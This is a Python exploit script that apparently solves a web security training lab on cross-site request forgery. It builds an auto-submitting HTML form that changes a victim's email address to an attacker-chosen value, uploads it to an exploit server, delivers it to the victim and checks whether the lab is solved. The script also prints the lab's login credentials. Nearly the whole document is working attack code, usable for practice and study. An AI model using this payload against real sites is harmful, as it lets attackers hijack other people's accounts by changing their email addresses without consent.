import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def csrf_attack(url, exploit_server):
    # URLs
    deliver_exploit = exploit_server + "/deliver-to-victim"

    # PAYLOAD
    payload = '<html><body><form class="login-form" name="change-email-form" action="{0}/my-account/change-email" method="POST"><label>Email</label><input required type="email" name="email" value="csrf@hacker.com"><button class=\'button\' type=\'submit\'> Update email </button></form><script>document.forms[0].submit()</script></body></html>'.format(url)

    # PARAMS for POST
    params = {
        'urlIsHttps' : 'on',
        'responseFile' : '/exploit',
        'responseHead' : 'HTTP/1.1 200 OK Content-Type: text/html; charset=utf-8',
        'responseBody' : payload,
        'formAction' : 'STORE'
    }

    # STORE PAYLOAD ON EXPLOIT SERVER
    r = requests.post(exploit_server, data=params, proxies=proxies, verify=False)
    if r.status_code != 200:
        print("[-] Error uploading the payload")
        sys.exit(-1)
    
    # DELIVER PAYLOAD TO VICTIM
    params['formAction'] = 'DELIVER_TO_VICTIM'
    r = requests.post(exploit_server, data=params, verify=False, proxies=proxies)
    if r.status_code != 200:
        print("[-] Error delivering the payload")
        sys.exit(-1)

    r = requests.get(url, verify=False, proxies=proxies)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Exploit successful! Lab solved!")
        sys.exit(-1)


def main():
    if len(sys.argv) != 3:
        print("[+] Usage: %s <url1> <url2>" % sys.argv[0])
        print("[+] Example: %s www.example.com www.exploit-server.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1].strip()
    exploit_server = sys.argv[2].strip()

    print("[+] Lab: CSRF vulnerability with no defenses")
    print("""[+] This lab's email change functionality is vulnerable to CSRF.
    To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.
You can log in to your own account using the following credentials: wiener:peter""")

    csrf_attack(url, exploit_server)

if __name__ == "__main__":
    main()